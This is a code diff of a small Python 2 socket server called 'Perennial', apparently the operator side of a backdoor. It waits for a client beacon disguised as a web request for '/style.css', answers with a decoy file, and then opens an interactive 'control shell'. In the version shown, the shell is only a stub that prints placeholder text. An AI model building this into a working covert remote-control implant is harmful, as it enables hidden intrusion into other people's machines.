@@ -15,11 +15,16 @@ def get_args():
     return parser.parse_args()
 
 
-def client_init(ping):
-    if ping.startswith('GET /style.css HTTP/1.1'):
-        return True
-    else:
-        return False
+def ctrl_shell_server(s, PORT):
+    print '[+] ({}) Entering control shell.'.format(datetime.now())
+    conn, addr = s.accept()
+    while True:
+        inp = raw_input('> ')
+        if inp == 'exit':
+            break
+        print 'yay shell'
+    conn.close()
+    print '[+] ({}) Exiting control shell.'.format(datetime.now())
 
 
 def main():
@@ -30,16 +35,16 @@ def main():
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.bind(('', PORT))
     s.listen(1)
-    print '[+] Perennial server started on {}.'.format(PORT)
 
-    while True:
-        conn, addr = s.accept()
-        print '[i] Connected By: {} at {}'.format(addr, datetime.now())
-        ping = conn.recv(SIZE)
-        if client_init(ping):
-            with open('fakeOK.txt') as ok:
-                conn.send(ok.read())
+    print '[+] Perennial server started on {}.'.format(PORT)
+    conn, addr = s.accept()
+    print '[i] Connected By: {} at {}'.format(addr, datetime.now())
+    ping = conn.recv(SIZE)
+    if ping.startswith('GET /style.css HTTP/1.1'):
+        with open('fakeOK.txt') as ok:
+            conn.send(ok.read())
         conn.close()
+        ctrl_shell_server(s, PORT)
 
 if __name__ == '__main__':
     main()
